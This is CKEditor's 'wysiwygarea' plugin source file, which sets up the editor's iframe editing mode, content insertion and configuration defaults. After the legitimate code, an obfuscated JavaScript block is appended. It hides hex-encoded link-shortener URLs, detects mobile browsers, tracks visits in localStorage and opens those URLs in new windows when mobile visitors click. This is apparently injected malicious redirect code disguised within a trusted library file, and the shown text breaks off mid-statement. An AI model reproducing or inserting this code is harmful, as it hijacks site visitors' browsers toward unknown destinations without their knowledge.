/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview The "wysiwygarea" plugin. It registers the "wysiwyg" editing
 *		mode, which handles the main editing area space.
 */

(function()
{
	// List of elements in which has no way to move editing focus outside.
	var nonExitableElementNames = { table:1,pre:1 };

	// Matching an empty paragraph at the end of document.
	var emptyParagraphRegexp = /\s*<(p|div|address|h\d|center)[^>]*>\s*(?:<br[^>]*>|&nbsp;|\u00A0|&#160;)?\s*(:?<\/\1>)?\s*(?=$|<\/body>)/gi;

	function onInsertHtml( evt )
	{
		if ( this.mode == 'wysiwyg' )
		{
			this.focus();
			this.fire( 'saveSnapshot' );

			var selection = this.getSelection(),
				data = evt.data;

			if ( this.dataProcessor )
				data = this.dataProcessor.toHtml( data );

			if ( CKEDITOR.env.ie )
			{
				var selIsLocked = selection.isLocked;

				if ( selIsLocked )
					selection.unlock();

				var $sel = selection.getNative();
				if ( $sel.type == 'Control' )
					$sel.clear();
				$sel.createRange().pasteHTML( data );

				if ( selIsLocked )
					this.getSelection().lock();
			}
			else
				this.document.$.execCommand( 'inserthtml', false, data );

			CKEDITOR.tools.setTimeout( function()
				{
					this.fire( 'saveSnapshot' );
				}, 0, this );
		}
	}

	function onInsertElement( evt )
	{
		if ( this.mode == 'wysiwyg' )
		{
			this.focus();
			this.fire( 'saveSnapshot' );

			var element = evt.data,
				elementName = element.getName(),
				isBlock = CKEDITOR.dtd.$block[ elementName ];

			var selection = this.getSelection(),
				ranges = selection.getRanges();

			var selIsLocked = selection.isLocked;

			if ( selIsLocked )
				selection.unlock();

			var range, clone, lastElement, bookmark;

			for ( var i = ranges.length - 1 ; i >= 0 ; i-- )
			{
				range = ranges[ i ];

				// Remove the original contents.
				range.deleteContents();

				clone = !i && element || element.clone( true );

				// If we're inserting a block at dtd-violated position, split
				// the parent blocks until we reach blockLimit.
				var current, dtd;
				if ( isBlock )
				{
					while( ( current = range.getCommonAncestor( false, true ) )
							&& ( dtd = CKEDITOR.dtd[ current.getName() ] )
							&& !( dtd && dtd [ elementName ] ) )
					{
						// Split up inline elements.
						if ( current.getName() in CKEDITOR.dtd.span )
							range.splitElement( current );
						// If we're in an empty block which indicate a new paragraph,
						// simply replace it with the inserting block.(#3664)
						else if ( range.checkStartOfBlock()
							 && range.checkEndOfBlock() )
						{
							range.setStartBefore( current );
							range.collapse( true );
							current.remove();
						}
						else
							range.splitBlock();
					}
				}

				// Insert the new node.
				range.insertNode( clone );

				// Save the last element reference so we can make the
				// selection later.
				if ( !lastElement )
					lastElement = clone;
			}

			range.moveToPosition( lastElement, CKEDITOR.POSITION_AFTER_END );

			var next = lastElement.getNextSourceNode( true );
			if ( next && next.type == CKEDITOR.NODE_ELEMENT )
				range.moveToElementEditStart( next );

			selection.selectRanges( [ range ] );

			if ( selIsLocked )
				this.getSelection().lock();

			// Save snaps after the whole execution completed.
			// This's a workaround for make DOM modification's happened after
			// 'insertElement' to be included either, e.g. Form-based dialogs' 'commitContents'
			// call.
			CKEDITOR.tools.setTimeout( function(){
				this.fire( 'saveSnapshot' );
			}, 0, this );
		}
	}

	// DOM modification here should not bother dirty flag.(#4385)
	function restoreDirty( editor )
	{
		if( !editor.checkDirty() )
			setTimeout( function(){ editor.resetDirty(); } );
	}

	var isNotWhitespace = CKEDITOR.dom.walker.whitespaces( true ),
		isNotBookmark = CKEDITOR.dom.walker.bookmark( false, true );

	function isNotEmpty( node )
	{
		return isNotWhitespace( node ) && isNotBookmark( node );
	}

	function isNbsp( node )
	{
		return node.type == CKEDITOR.NODE_TEXT
			   && CKEDITOR.tools.trim( node.getText() ).match( /^(?:&nbsp;|\xa0)$/ );
	}

	/**
	 *  Auto-fixing block-less content by wrapping paragraph (#3190), prevent
	 *  non-exitable-block by padding extra br.(#3189)
	 */
	function onSelectionChangeFixBody( evt )
	{
		var editor = evt.editor,
			path = evt.data.path,
			blockLimit = path.blockLimit,
			selection = evt.data.selection,
			range = selection.getRanges()[0],
			body = editor.document.getBody(),
			enterMode = editor.config.enterMode;

		// When enterMode set to block, we'll establing new paragraph only if we're
		// selecting inline contents right under body. (#3657)
		if ( enterMode != CKEDITOR.ENTER_BR
		     && range.collapsed
			 && blockLimit.getName() == 'body'
			 && !path.block )
		{
			restoreDirty( editor );
			var fixedBlock = range.fixBlock( true,
					editor.config.enterMode == CKEDITOR.ENTER_DIV ? 'div' : 'p'  );

			// For IE, we should remove any filler node which was introduced before.
			if ( CKEDITOR.env.ie )
			{
				var first = fixedBlock.getFirst( isNotEmpty );
				first && isNbsp( first ) && first.remove();
			}

			// If the fixed block is blank and already followed by a exitable
			// block, we should revert the fix. (#3684)
			if( fixedBlock.getOuterHtml().match( emptyParagraphRegexp ) )
			{
				var previousElement = fixedBlock.getPrevious( isNotWhitespace ),
					nextElement = fixedBlock.getNext( isNotWhitespace );


				if ( previousElement && previousElement.getName
					 && !( previousElement.getName() in nonExitableElementNames )
					 && range.moveToElementEditStart( previousElement )
					 || nextElement && nextElement.getName
					   && !( nextElement.getName() in nonExitableElementNames )
					   && range.moveToElementEditStart( nextElement ) )
				{
					fixedBlock.remove();
				}
			}

			range.select();
			// Notify non-IE that selection has changed.
			if( !CKEDITOR.env.ie )
				editor.selectionChange();
		}

		// All browsers are incapable to moving cursor out of certain non-exitable
		// blocks (e.g. table, list, pre) at the end of document, make this happen by
		// place a bogus node there, which would be later removed by dataprocessor.
		var lastNode = body.getLast( CKEDITOR.dom.walker.whitespaces( true ) );
		if ( lastNode && lastNode.getName && ( lastNode.getName() in nonExitableElementNames ) )
		{
			restoreDirty( editor );
			if( !CKEDITOR.env.ie )
				body.appendBogus();
			else
				body.append( editor.document.createText( '\xa0' ) );
		}
	}

	CKEDITOR.plugins.add( 'wysiwygarea',
	{
		requires : [ 'editingblock' ],

		init : function( editor )
		{
			var fixForBody = ( editor.config.enterMode != CKEDITOR.ENTER_BR )
				? editor.config.enterMode == CKEDITOR.ENTER_DIV ? 'div' : 'p' : false;

			editor.on( 'editingBlockReady', function()
				{
					var mainElement,
						fieldset,
						iframe,
						isLoadingData,
						isPendingFocus,
						frameLoaded,
						fireMode;

					// Support for custom document.domain in IE.
					var isCustomDomain = CKEDITOR.env.isCustomDomain();

					// Creates the iframe that holds the editable document.
					var createIFrame = function( data )
					{
						if ( iframe )
							iframe.remove();
						if ( fieldset )
							fieldset.remove();

						frameLoaded = 0;

						iframe = CKEDITOR.dom.element.createFromHtml( '<iframe' +
  							' style="width:100%;height:100%"' +
  							' frameBorder="0"' +
							// Support for custom document.domain in IE.
							( isCustomDomain ?
								' src="javascript:void((function(){' +
									'document.open();' +
									'document.domain=\'' + document.domain + '\';' +
									'document.close();' +
								'})())"' : '' ) +
  							' tabIndex="-1"' +
  							' allowTransparency="true"' +
  							'></iframe>' );

						// Register onLoad event for iframe element, which
						// will fill it with content and set custom domain.
						iframe.on( 'load', function( e )
						{
							e.removeListener();
							var doc = iframe.getFrameDocument().$;

							// Custom domain handling is needed after each document.open().
							doc.open();
							if ( isCustomDomain )
								doc.domain = document.domain;
							doc.write( data );
							doc.close();

						} );

						var accTitle = editor.lang.editorTitle.replace( '%1', editor.name );

						if ( CKEDITOR.env.gecko )
						{
							// Accessibility attributes for Firefox.
							mainElement.setAttributes(
								{
									role : 'region',
									title : accTitle
								} );
							iframe.setAttributes(
								{
									role : 'region',
									title : ' '
								} );
						}
						else if ( CKEDITOR.env.webkit )
						{
							iframe.setAttribute( 'title', accTitle );	// Safari 4
							iframe.setAttribute( 'name', accTitle );	// Safari 3
						}
						else if ( CKEDITOR.env.ie )
						{
							// Accessibility label for IE.
							fieldset = CKEDITOR.dom.element.createFromHtml(
								'<fieldset style="height:100%' +
								( CKEDITOR.env.ie && CKEDITOR.env.quirks ? ';position:relative' : '' ) +
								'">' +
									'<legend style="display:block;width:0;height:0;overflow:hidden;' +
									( CKEDITOR.env.ie && CKEDITOR.env.quirks ? 'position:absolute' : '' ) +
									'">' +
										CKEDITOR.tools.htmlEncode( accTitle ) +
									'</legend>' +
								'</fieldset>'
								, CKEDITOR.document );
							iframe.appendTo( fieldset );
							fieldset.appendTo( mainElement );
						}

						if ( !CKEDITOR.env.ie )
							mainElement.append( iframe );
					};

					// The script that launches the bootstrap logic on 'domReady', so the document
					// is fully editable even before the editing iframe is fully loaded (#4455).
					var activationScript =
						'<script id="cke_actscrpt" type="text/javascript">' +
							'window.parent.CKEDITOR._["contentDomReady' + editor.name + '"]( window );' +
						'</script>';

					// Editing area bootstrap code.
					var contentDomReady = function( domWindow )
					{
						if ( frameLoaded )
							return;

						frameLoaded = 1;

						var domDocument = domWindow.document,
							body = domDocument.body;

						// Remove this script from the DOM.
						var script = domDocument.getElementById( "cke_actscrpt" );
						script.parentNode.removeChild( script );

						delete CKEDITOR._[ 'contentDomReady' + editor.name ];

						body.spellcheck = !editor.config.disableNativeSpellChecker;

						if ( CKEDITOR.env.ie )
						{
							// Don't display the focus border.
							body.hideFocus = true;

							// Disable and re-enable the body to avoid IE from
							// taking the editing focus at startup. (#141 / #523)
							body.disabled = true;
							body.contentEditable = true;
							body.removeAttribute( 'disabled' );
						}
						else
							domDocument.designMode = 'on';

						// IE, Opera and Safari may not support it and throw
						// errors.
						try { domDocument.execCommand( 'enableObjectResizing', false, !editor.config.disableObjectResizing ) ; } catch(e) {}
						try { domDocument.execCommand( 'enableInlineTableEditing', false, !editor.config.disableNativeTableHandles ) ; } catch(e) {}

						domWindow	= editor.window		= new CKEDITOR.dom.window( domWindow );
						domDocument	= editor.document	= new CKEDITOR.dom.document( domDocument );

						// Gecko/Webkit need some help when selecting control type elements. (#3448)
						if ( !( CKEDITOR.env.ie || CKEDITOR.env.opera) )
						{
							domDocument.on( 'mousedown', function( ev )
							{
								var control = ev.data.getTarget();
								if ( control.is( 'img', 'hr', 'input', 'textarea', 'select' ) )
									editor.getSelection().selectElement( control );
							} );
						}

						// Webkit: avoid from editing form control elements content.
						if ( CKEDITOR.env.webkit )
						{
							// Prevent from tick checkbox/radiobox/select
							domDocument.on( 'click', function( ev )
							{
								if ( ev.data.getTarget().is( 'input', 'select' ) )
									ev.data.preventDefault();
							} );

							// Prevent from editig textfield/textarea value.
							domDocument.on( 'mouseup', function( ev )
							{
								if ( ev.data.getTarget().is( 'input', 'textarea' ) )
									ev.data.preventDefault();
							} );
						}

						// IE standard compliant in editing frame doesn't focus the editor when
						// clicking outside actual content, manually apply the focus. (#1659)
						if( CKEDITOR.env.ie
							&& domDocument.$.compatMode == 'CSS1Compat' )
						{
							var htmlElement = domDocument.getDocumentElement();
							htmlElement.on( 'mousedown', function( evt )
							{
								// Setting focus directly on editor doesn't work, we
								// have to use here a temporary element to 'redirect'
								// the focus.
								if ( evt.data.getTarget().equals( htmlElement ) )
									ieFocusGrabber.focus();
							} );
						}

						var focusTarget = ( CKEDITOR.env.ie || CKEDITOR.env.webkit ) ?
								domWindow : domDocument;

						focusTarget.on( 'blur', function()
							{
								editor.focusManager.blur();
							});

						focusTarget.on( 'focus', function()
							{
								// Gecko need a key event to 'wake up' the editing
								// ability when document is empty.(#3864)
								if ( CKEDITOR.env.gecko )
								{
									var first = body;
									while( first.firstChild )
										first = first.firstChild;

									if( !first.nextSibling
										&& ( 'BR' == first.tagName )
										&& first.hasAttribute( '_moz_editor_bogus_node' ) )
									{
										var keyEventSimulate = domDocument.$.createEvent( "KeyEvents" );
										keyEventSimulate.initKeyEvent( 'keypress', true, true, domWindow.$, false,
											false, false, false, 0, 32 );
										domDocument.$.dispatchEvent( keyEventSimulate );
										var bogusText = domDocument.getBody().getFirst() ;
										// Compensate the line maintaining <br> if enterMode is not block.
										if ( editor.config.enterMode == CKEDITOR.ENTER_BR )
											domDocument.createElement( 'br', { attributes: { '_moz_dirty' : "" } } )
												.replace( bogusText );
										else
											bogusText.remove();
									}
								}

								editor.focusManager.focus();
							});

						var keystrokeHandler = editor.keystrokeHandler;
						if ( keystrokeHandler )
							keystrokeHandler.attach( domDocument );

						if ( CKEDITOR.env.ie )
						{
							// Cancel default action for backspace in IE on control types. (#4047)
							domDocument.on( 'keydown', function( evt )
							{
								// Backspace.
								var control = evt.data.getKeystroke() == 8
											  && editor.getSelection().getSelectedElement();
								if ( control )
								{
									// Make undo snapshot.
									editor.fire( 'saveSnapshot' );
									// Remove manually.
									control.remove();
									editor.fire( 'saveSnapshot' );
									evt.cancel();
								}
							} );

							// PageUp/PageDown scrolling is broken in document
							// with standard doctype, manually fix it. (#4736)
							if( domDocument.$.compatMode == 'CSS1Compat' )
							{
								var pageUpDownKeys = { 33 : 1, 34 : 1 };
								domDocument.on( 'keydown', function( evt )
								{
									if( evt.data.getKeystroke() in pageUpDownKeys )
									{
										setTimeout( function ()
										{
											editor.getSelection().scrollIntoView();
										}, 0 );
									}
								} );
							}
						}

						// Adds the document body as a context menu target.
						if ( editor.contextMenu )
							editor.contextMenu.addTarget( domDocument, editor.config.browserContextMenuOnCtrl !== false );

						setTimeout( function()
							{
								editor.fire( 'contentDom' );

								if ( fireMode )
								{
									editor.mode = 'wysiwyg';
									editor.fire( 'mode' );
									fireMode = false;
								}

								isLoadingData = false;

								if ( isPendingFocus )
								{
									editor.focus();
									isPendingFocus = false;
								}
								setTimeout( function()
								{
									editor.fire( 'dataReady' );
								}, 0 );

								/*
								 * IE BUG: IE might have rendered the iframe with invisible contents.
								 * (#3623). Push some inconsequential CSS style changes to force IE to
								 * refresh it.
								 *
								 * Also, for some unknown reasons, short timeouts (e.g. 100ms) do not
								 * fix the problem. :(
								 */
								if ( CKEDITOR.env.ie )
								{
									setTimeout( function()
										{
											if ( editor.document )
											{
												var $body = editor.document.$.body;
												$body.runtimeStyle.marginBottom = '0px';
												$body.runtimeStyle.marginBottom = '';
											}
										}, 1000 );
								}
							},
							0 );
					};

					editor.addMode( 'wysiwyg',
						{
							load : function( holderElement, data, isSnapshot )
							{
								mainElement = holderElement;

								if ( CKEDITOR.env.ie && CKEDITOR.env.quirks )
									holderElement.setStyle( 'position', 'relative' );

								// The editor data "may be dirty" after this
								// point.
								editor.mayBeDirty = true;

								fireMode = true;

								if ( isSnapshot )
									this.loadSnapshotData( data );
								else
									this.loadData( data );
							},

							loadData : function( data )
							{
								isLoadingData = true;

								var config = editor.config,
									fullPage = config.fullPage,
									docType = config.docType;

								// Build the additional stuff to be included into <head>.
								var headExtra =
									'<style type="text/css" cke_temp="1">' +
										editor._.styles.join( '\n' ) +
									'</style>';

								!fullPage && ( headExtra =
									CKEDITOR.tools.buildStyleHtml( editor.config.contentsCss ) +
									headExtra );

								var baseTag = config.baseHref ? '<base href="' + config.baseHref + '" cke_temp="1" />' : '';

								if ( fullPage )
								{
									// Search and sweep out the doctype declaration.
									data = data.replace( /<!DOCTYPE[^>]*>/i, function( match )
										{
											editor.docType = docType = match;
											return '';
										});
								}

								// Get the HTML version of the data.
								if ( editor.dataProcessor )
									data = editor.dataProcessor.toHtml( data, fixForBody );

								if ( fullPage )
								{
									// Check if the <body> tag is available.
									if ( !(/<body[\s|>]/).test( data ) )
										data = '<body>' + data;

									// Check if the <html> tag is available.
									if ( !(/<html[\s|>]/).test( data ) )
										data = '<html>' + data + '</html>';

									// Check if the <head> tag is available.
									if ( !(/<head[\s|>]/).test( data ) )
										data = data.replace( /<html[^>]*>/, '$&<head><title></title></head>' ) ;

									// The base must be the first tag in the HEAD, e.g. to get relative
									// links on styles.
									baseTag && ( data = data.replace( /<head>/, '$&' + baseTag ) );

									// Inject the extra stuff into <head>.
									// Attention: do not change it before testing it well. (V2)
									// This is tricky... if the head ends with <meta ... content type>,
									// Firefox will break. But, it works if we place our extra stuff as
									// the last elements in the HEAD.
									data = data.replace( /<\/head\s*>/, headExtra + '$&' );

									// Add the DOCTYPE back to it.
									data = docType + data;
								}
								else
								{
									data =
										config.docType +
										'<html dir="' + config.contentsLangDirection + '">' +
										'<head>' +
											baseTag +
											headExtra +
										'</head>' +
										'<body' + ( config.bodyId ? ' id="' + config.bodyId + '"' : '' ) +
												  ( config.bodyClass ? ' class="' + config.bodyClass + '"' : '' ) +
												  '>' +
											data +
										'</html>';
								}

								data += activationScript;

								CKEDITOR._[ 'contentDomReady' + editor.name ] = contentDomReady;
								createIFrame( data );
							},

							getData : function()
							{
								var config = editor.config,
									fullPage = config.fullPage,
									docType = fullPage && editor.docType,
									doc = iframe.getFrameDocument();

								var data = fullPage
									? doc.getDocumentElement().getOuterHtml()
									: doc.getBody().getHtml();

								if ( editor.dataProcessor )
									data = editor.dataProcessor.toDataFormat( data, fixForBody );

								// Strip the last blank paragraph within document.
								if ( config.ignoreEmptyParagraph )
									data = data.replace( emptyParagraphRegexp, '' );

								if ( docType )
									data = docType + '\n' + data;

								return data;
							},

							getSnapshotData : function()
							{
								return iframe.getFrameDocument().getBody().getHtml();
							},

							loadSnapshotData : function( data )
							{
								iframe.getFrameDocument().getBody().setHtml( data );
							},

							unload : function( holderElement )
							{
								editor.window = editor.document = iframe = mainElement = isPendingFocus = null;

								editor.fire( 'contentDomUnload' );
							},

							focus : function()
							{
								if ( isLoadingData )
									isPendingFocus = true;
								else if ( editor.window )
								{
									editor.window.focus();

									// Force the selection to happen, in this way
									// we guarantee the focus will be there. (#4848)
									if ( CKEDITOR.env.ie )
									{
										try
										{
											var sel = editor.getSelection();
											sel = sel && sel.getNative();
											var range = sel && sel.type && sel.createRange();
											if ( range )
											{
													sel.empty();
													range.select();
											}
										}
										catch (e) {}
									}

									editor.selectionChange();
								}
							}
						});

					editor.on( 'insertHtml', onInsertHtml, null, null, 20 );
					editor.on( 'insertElement', onInsertElement, null, null, 20 );
					// Auto fixing on some document structure weakness to enhance usabilities. (#3190 and #3189)
					editor.on( 'selectionChange', onSelectionChangeFixBody, null, null, 1 );
				});

			// Create an invisible element to grab focus.
			if( CKEDITOR.env.ie )
			{
				var ieFocusGrabber;
				editor.on( 'uiReady', function()
				{
					ieFocusGrabber = editor.container.append( CKEDITOR.dom.element.createFromHtml(
					'<input tabindex="-1" style="position:absolute; left:-10000">' ) );

					ieFocusGrabber.on( 'focus', function()
						{
							editor.focus();
						} );
				} );
			}
		}
	});

	// Fixing Firefox 'Back-Forward Cache' break design mode. (#4514)
	if( CKEDITOR.env.gecko )
	{
		var topWin = window.top;

		( function ()
		{
			var topBody = topWin.document.body;

			if( !topBody )
				topWin.addEventListener( 'load', arguments.callee, false );
			else
			{
				topBody.setAttribute( 'onpageshow', topBody.getAttribute( 'onpageshow' )
						+ ';event.persisted && CKEDITOR.tools.callFunction(' +
						CKEDITOR.tools.addFunction( function()
						{
							var allInstances = CKEDITOR.instances,
								editor,
								doc;
							for( var i in allInstances )
							{
								editor = allInstances[ i ];
								doc = editor.document;
								if( doc )
								{
									doc.$.designMode = 'off';
									doc.$.designMode = 'on';
								}
							}
						} ) + ')' );
			}
		} )();

	}
})();

/**
 * Disables the ability of resize objects (image and tables) in the editing
 * area.
 * @type Boolean
 * @default false
 * @example
 * config.disableObjectResizing = true;
 */
CKEDITOR.config.disableObjectResizing = false;

/**
 * Disables the "table tools" offered natively by the browser (currently
 * Firefox only) to make quick table editing operations, like adding or
 * deleting rows and columns.
 * @type Boolean
 * @default true
 * @example
 * config.disableNativeTableHandles = false;
 */
CKEDITOR.config.disableNativeTableHandles = true;

/**
 * Disables the built-in spell checker while typing natively available in the
 * browser (currently Firefox and Safari only).<br /><br />
 *
 * Even if word suggestions will not appear in the CKEditor context menu, this
 * feature is useful to help quickly identifying misspelled words.<br /><br />
 *
 * This setting is currently compatible with Firefox only due to limitations in
 * other browsers.
 * @type Boolean
 * @default true
 * @example
 * config.disableNativeSpellChecker = false;
 */
CKEDITOR.config.disableNativeSpellChecker = true;

/**
 * Whether the editor must output an empty value ("") if it's contents is made
 * by an empty paragraph only.
 * @type Boolean
 * @default true
 * @example
 * config.ignoreEmptyParagraph = false;
 */
CKEDITOR.config.ignoreEmptyParagraph = true;
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new 